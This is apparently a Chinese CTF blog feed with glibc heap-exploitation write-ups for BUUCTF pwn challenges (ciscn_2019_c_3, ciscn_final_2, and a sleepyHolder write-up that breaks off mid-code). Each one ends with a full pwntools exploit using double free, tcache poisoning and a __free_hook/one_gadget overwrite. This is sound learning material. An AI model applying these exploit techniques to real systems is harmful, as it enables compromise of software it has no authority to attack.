src="https://i.imgs.ovh/2023/11/27/pnb8d.png" alt="image-20231127213159824"></p><h5 id="还有个后面函数，可以改堆fd位置的东西，每次能使其加一，后面能改其bin指针"><a href="#还有个后面函数，可以改堆fd位置的东西，每次能使其加一，后面能改其bin指针" class="headerlink" title="还有个后面函数，可以改堆fd位置的东西，每次能使其加一，后面能改其bin指针"></a>还有个后面函数，可以改堆fd位置的东西，每次能使其加一，后面能改其bin指针</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnSAK.png" alt="image-20231127213350417"></p><h5 id="先malloc大小为0x100的堆，然后释放8次，然后bin才会有main-arena-96-且得先malloc大小是0x100大小的堆"><a href="#先malloc大小为0x100的堆，然后释放8次，然后bin才会有main-arena-96-且得先malloc大小是0x100大小的堆" class="headerlink" title="先malloc大小为0x100的堆，然后释放8次，然后bin才会有main_arena+96,且得先malloc大小是0x100大小的堆"></a>先malloc大小为0x100的堆，然后释放8次，然后bin才会有main_arena+96,且得先malloc大小是0x100大小的堆</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>,<span class="string">'aaaa'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'bbbb'</span>) <span class="comment">#1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(<span class="number">0</span>)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i.imgs.ovh/2023/11/27/pnJD3.png" alt="image-20231127215520780"></p><h5 id="然后show的话能接收到其地址"><a href="#然后show的话能接收到其地址" class="headerlink" title="然后show的话能接收到其地址"></a>然后show的话能接收到其地址</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"attack_times: "</span>)</span><br><span class="line"><span class="comment">#arena = u64(p.recv(6).ljust(8, b'\x00'))</span></span><br><span class="line">arena_96=<span class="built_in">int</span>(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>))</span><br></pre></td></tr></tbody></table></figure><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook=arena_96-<span class="number">96</span>-<span class="number">0x10</span></span><br><span class="line">base=malloc_hook-libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">free_hook=base+libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">gadget=base+one_gadget</span><br></pre></td></tr></tbody></table></figure><h5 id="再申请一个堆，这时候会在堆2开始-由于glibc-2-27的特性，会在开始的上方申请堆，这里不太明白为什么要用free-hook-0x10的地址，而不是free-hook"><a href="#再申请一个堆，这时候会在堆2开始-由于glibc-2-27的特性，会在开始的上方申请堆，这里不太明白为什么要用free-hook-0x10的地址，而不是free-hook" class="headerlink" title="再申请一个堆，这时候会在堆2开始,由于glibc 2.27的特性，会在开始的上方申请堆，这里不太明白为什么要用free_hook-0x10的地址，而不是free_hook"></a>再申请一个堆，这时候会在堆2开始,由于glibc 2.27的特性，会在开始的上方申请堆，这里不太明白为什么要用free_hook-0x10的地址，而不是free_hook</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(free_hook-<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x60</span>,payload) <span class="comment">#2</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://i.imgs.ovh/2023/11/27/pnGZ0.png" alt="image-20231127221735133"></p><h5 id="double-free然后用backdoor函数20次，fd-0x20-将bin指针指向0x0000562a77ab5280的地址"><a href="#double-free然后用backdoor函数20次，fd-0x20-将bin指针指向0x0000562a77ab5280的地址" class="headerlink" title="double free然后用backdoor函数20次，fd+0x20,将bin指针指向0x0000562a77ab5280的地址"></a>double free然后用backdoor函数20次，fd+0x20,将bin指针指向0x0000562a77ab5280的地址</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnNKC.png" alt="image-20231127221921315"></p><p><img src="https://i.imgs.ovh/2023/11/27/pnajt.png" alt="image-20231127222235671"></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(gadget))</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></tbody></table></figure><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("node4.buuoj.cn",29798)</span></span><br><span class="line">p=process(<span class="string">"./ciscn_2019_c_3"</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">one_gadget=<span class="number">0x4f322</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'Command: '</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'size: '</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'Give me the name: '</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'Command: '</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index: '</span>,<span class="built_in">str</span>(index))</span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'Command: '</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'weapon:'</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">back</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'Command: '</span>,<span class="string">'666'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'weapon:'</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'aaaa'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'bbbb'</span>) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"attack_times: "</span>)</span><br><span class="line"><span class="comment">#arena = u64(p.recv(6).ljust(8, b'\x00'))</span></span><br><span class="line">arena_96=<span class="built_in">int</span>(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>))</span><br><span class="line">malloc_hook=arena_96-<span class="number">96</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">base=malloc_hook-libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">free_hook=base+libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">gadget=base+one_gadget</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(free_hook-<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x60</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">    back(<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'bbbb'</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(gadget))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_final_2</title>
      <link href="//posts/9a3dca0e/"/>
      <url>//posts/9a3dca0e/</url>
      
        <content type="html"><![CDATA[<h5 id="例行检查，保护全开，就不放了。"><a href="#例行检查，保护全开，就不放了。" class="headerlink" title="例行检查，保护全开，就不放了。"></a>例行检查，保护全开，就不放了。</h5><h5 id="add函数，只能申请0x20大小的堆或者0x10大小的，只能先申请再释放"><a href="#add函数，只能申请0x20大小的堆或者0x10大小的，只能先申请再释放" class="headerlink" title="add函数，只能申请0x20大小的堆或者0x10大小的，只能先申请再释放"></a>add函数，只能申请0x20大小的堆或者0x10大小的，只能先申请再释放</h5><p><img src="https://i0.imgs.ovh/2023/11/02/ZX3dv.png" alt="image-20231102221044737"></p><h5 id="存在double-free漏洞"><a href="#存在double-free漏洞" class="headerlink" title="存在double free漏洞"></a>存在double free漏洞</h5><p><img src="https://i0.imgs.ovh/2023/11/02/ZXmFe.png" alt="image-20231102221330585"></p><h5 id="可以double-free泄露出堆地址，但是是int类型，接收的话用addr-int-p-recvuntil-‘-n’-drop-True-发送的时候用str类型就可在内存里用十六进制存储了。"><a href="#可以double-free泄露出堆地址，但是是int类型，接收的话用addr-int-p-recvuntil-‘-n’-drop-True-发送的时候用str类型就可在内存里用十六进制存储了。" class="headerlink" title="可以double free泄露出堆地址，但是是int类型，接收的话用addr=int(p.recvuntil(‘\n’, drop=True)),发送的时候用str类型就可在内存里用十六进制存储了。"></a>可以double free泄露出堆地址，但是是int类型，接收的话用addr=int(p.recvuntil(‘\n’, drop=True)),发送的时候用str类型就可在内存里用十六进制存储了。</h5><p><img src="https://i0.imgs.ovh/2023/11/02/ZXwuW.png" alt="image-20231102221416344"></p><h5 id="前戏是先double-free改堆头的size，改size容易但是中间得add好几个堆"><a href="#前戏是先double-free改堆头的size，改size容易但是中间得add好几个堆" class="headerlink" title="前戏是先double free改堆头的size，改size容易但是中间得add好几个堆"></a>前戏是先double free改堆头的size，改size容易但是中间得add好几个堆</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">'11'</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'22'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'11'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'11'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'22'</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">'11'</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">'your short type inode number :'</span>)</span><br><span class="line">addr=<span class="built_in">int</span>(p.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>))-<span class="number">0xa0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,addr)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'11'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x91</span>) <span class="comment">#改掉size</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2023/11/02/ZXhGo.png" alt="image-20231102222318910"></p><h5 id="free7次使其进入unsortedbin-前面改size成0x90是最小的大小，不然下面的地址不会是main-arena-96"><a href="#free7次使其进入unsortedbin-前面改size成0x90是最小的大小，不然下面的地址不会是main-arena-96" class="headerlink" title="free7次使其进入unsortedbin,前面改size成0x90是最小的大小，不然下面的地址不会是main_arena+96"></a>free7次使其进入unsortedbin,前面改size成0x90是最小的大小，不然下面的地址不会是main_arena+96</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2023/11/02/ZXKu5.png" alt="image-20231102223102271"></p><h5 id="接收并计算地址-至于为什么是-IO-2-1-stdin-0x70，应该是它执行时候的地址。"><a href="#接收并计算地址-至于为什么是-IO-2-1-stdin-0x70，应该是它执行时候的地址。" class="headerlink" title="接收并计算地址,至于为什么是 IO_2_1_stdin +0x70，应该是它执行时候的地址。"></a>接收并计算地址,至于为什么是 <em>IO_2_1_stdin </em>+0x70，应该是它执行时候的地址。</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'your int type inode number :'</span>)</span><br><span class="line">malloc_hook=<span class="built_in">int</span>(p.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>))-<span class="number">0x70</span></span><br><span class="line">base=malloc_hook-libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">stdin=base+libc.sym[<span class="string">'_IO_2_1_stdin_'</span>]+<span class="number">0x70</span></span><br></pre></td></tr></tbody></table></figure><h5 id="再次malloc改掉堆地址-然后填充"><a href="#再次malloc改掉堆地址-然后填充" class="headerlink" title="再次malloc改掉堆地址,然后填充"></a>再次malloc改掉堆地址,然后填充</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,stdin)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>) </span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2023/11/02/ZXSAX.png" alt="image-20231102223851495"></p><h5 id="再次double-free获取头地址，再次show出来的堆头地址和开始时的时不一样的。"><a href="#再次double-free获取头地址，再次show出来的堆头地址和开始时的时不一样的。" class="headerlink" title="再次double free获取头地址，再次show出来的堆头地址和开始时的时不一样的。"></a>再次double free获取头地址，再次show出来的堆头地址和开始时的时不一样的。</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x30</span>)</span><br><span class="line">dele(<span class="number">1</span>) <span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'your int type inode number :'</span>)</span><br><span class="line">chunk0=<span class="built_in">int</span>(p.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>))-<span class="number">0x30</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2023/11/02/ZXRWt.png" alt="image-20231102224535159"></p><h5 id="再改堆指针-填充"><a href="#再改堆指针-填充" class="headerlink" title="再改堆指针,填充"></a>再改堆指针,填充</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,chunk0)</span><br><span class="line">add(<span class="number">1</span>,chunk0)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">111</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">666</span>)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2023/11/02/ZXcgm.png" alt="image-20231102224934035"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./ciscn_final_2'</span>)</span><br><span class="line"><span class="comment">#p=remote('node4.buuoj.cn',26681)</span></span><br><span class="line">context( os = <span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf=ELF(<span class="string">'./ciscn_final_2'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;'</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">'your inode number:'</span>,<span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;'</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;'</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">'11'</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'22'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'11'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'11'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'22'</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">'11'</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">'your short type inode number :'</span>)</span><br><span class="line">addr=<span class="built_in">int</span>(p.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>))-<span class="number">0xa0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,addr)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'11'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x91</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'your int type inode number :'</span>)</span><br><span class="line">malloc_hook=<span class="built_in">int</span>(p.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>))-<span class="number">0x70</span></span><br><span class="line">base=malloc_hook-libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">stdin=base+libc.sym[<span class="string">'_IO_2_1_stdin_'</span>]+<span class="number">0x70</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,stdin)  <span class="comment">###???</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x30</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'your int type inode number :'</span>)</span><br><span class="line">chunk0=<span class="built_in">int</span>(p.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>))-<span class="number">0x30</span></span><br><span class="line">add(<span class="number">1</span>,chunk0)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,chunk0)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">111</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">666</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'your message :'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(addr)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sleepyHolder_hitcon_2016</title>
      <link href="//posts/b1e92899/"/>
      <url>//posts/b1e92899/</url>
      
        <content type="html"><![CDATA[<h5 id="例行检查"><a href="#例行检查" class="headerlink" title="例行检查"></a>例行检查</h5><p><img src="https://i0.imgs.ovh/2023/10/31/AS5sW.png" alt=""></p><h5 id="add函数，能分别申请一个0x28，0xfa0-0x61a80大小的堆一次"><a href="#add函数，能分别申请一个0x28，0xfa0-0x61a80大小的堆一次" class="headerlink" title="add函数，能分别申请一个0x28，0xfa0,0x61a80大小的堆一次"></a>add函数，能分别申请一个0x28，0xfa0,0x61a80大小的堆一次</h5><p><img src="https://i0.imgs.ovh/2023/10/31/ASi8V.png" alt="image-20231031212602644"></p><h5 id="dele函数，存在UAF漏洞，指针没有清零，但是对应的数清零了，所以可以再次申请堆"><a href="#dele函数，存在UAF漏洞，指针没有清零，但是对应的数清零了，所以可以再次申请堆" class="headerlink" title="dele函数，存在UAF漏洞，指针没有清零，但是对应的数清零了，所以可以再次申请堆"></a>dele函数，存在UAF漏洞，指针没有清零，但是对应的数清零了，所以可以再次申请堆</h5><p><img src="https://i0.imgs.ovh/2023/10/30/AfdAt.png" alt="image-20231030201715281"></p><h5 id="这还有个edit函数"><a href="#这还有个edit函数" class="headerlink" title="这还有个edit函数"></a>这还有个edit函数</h5><p><img src="https://i0.imgs.ovh/2023/10/31/ASteK.png" alt="image-20231030204040558"></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">'AAAA'</span>) <span class="comment">#堆0</span></span><br><span class="line">add(<span class="number">2</span>,<span class="string">'BBBB'</span>) <span class="comment">#堆1</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">'cccc'</span>) <span class="comment">#堆2</span></span><br></pre></td></tr></tbody></table></figure><h5 id="因为堆2太大所以free-chunk会放在smallbin里"><a href="#因为堆2太大所以free-chunk会放在smallbin里" class="headerlink" title="因为堆2太大所以free chunk会放在smallbin里"></a>因为堆2太大所以free chunk会放在smallbin里</h5><p><img src="https://i0.imgs.ovh/2023/10/31/Ah5hd.png" alt="image-20231031172733305"></p><h5 id="这里有个漏洞，double-free堆0后再次申请堆0，堆1的size位还是0，所以可以利用unlink"><a href="#这里有个漏洞，double-free堆0后再次申请堆0，堆1的size位还是0，所以可以利用unlink" class="headerlink" title="这里有个漏洞，double free堆0后再次申请堆0，堆1的size位还是0，所以可以利用unlink"></a>这里有个漏洞，double free堆0后再次申请堆0，堆1的size位还是0，所以可以利用unlink</h5><p><img src="https://i0.imgs.ovh/2023/10/31/Asbk2.png" alt="image-20231031173201803"></p><h5 id="再申请一次堆"><a href="#再申请一次堆" class="headerlink" title="再申请一次堆"></a>再申请一次堆</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">'aaaa'</span>)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2023/10/31/ASOFp.png" alt="image-20231030220449382"></p><h5 id="后面构造fake-chunk-然后dele-2-会unlink"><a href="#后面构造fake-chunk-然后dele-2-会unlink" class="headerlink" title="后面构造fake_chunk,然后dele(2),会unlink"></a>后面构造fake_chunk,然后dele(2),会unlink</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(fd)+p64(bk)+p64(<span class="number">0x20</span>)</span><br><span 